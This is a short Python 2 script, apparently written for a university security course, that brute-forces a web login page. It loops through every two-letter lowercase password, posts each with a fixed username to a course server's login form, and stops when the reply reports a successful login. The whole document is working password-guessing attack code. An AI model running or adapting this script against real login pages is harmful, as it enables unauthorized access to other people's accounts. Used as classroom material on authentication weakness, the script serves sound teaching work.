import urllib
import urllib2
import itertools
import cookielib 
import re
import time
start_time = time.time()
ls=["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]

jar = cookielib.FileCookieJar("cookie")
openThis = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
url = "http://cs5339.cs.utep.edu/longpre/loginScreen.php"
user = "jonathan1_-KnS"
 
for i in range(2,3):                                    #Permutator for the combinations of letters
    for j in itertools.product(ls,repeat=i):
        pasw = ''.join(j)                               #Append letters
        params = {"un":user,"pw":pasw}                  #Set user and password as parameters
        params = urllib.urlencode(params)               #Encode parameters
        login_request = urllib2.Request(url,params)     #Request conexion
        login_reply = openThis.open(login_request)      #Open the request
        login_reply_data = login_reply.read()           #read the reply data
        reply_msg = re.compile("login was successful")  #Set desired messege
        if(reply_msg.search(login_reply_data)):         #Search for desired messege
           print ("Time: %s" %(time.time()-start_time),"password is: ",pasw)
           break
        
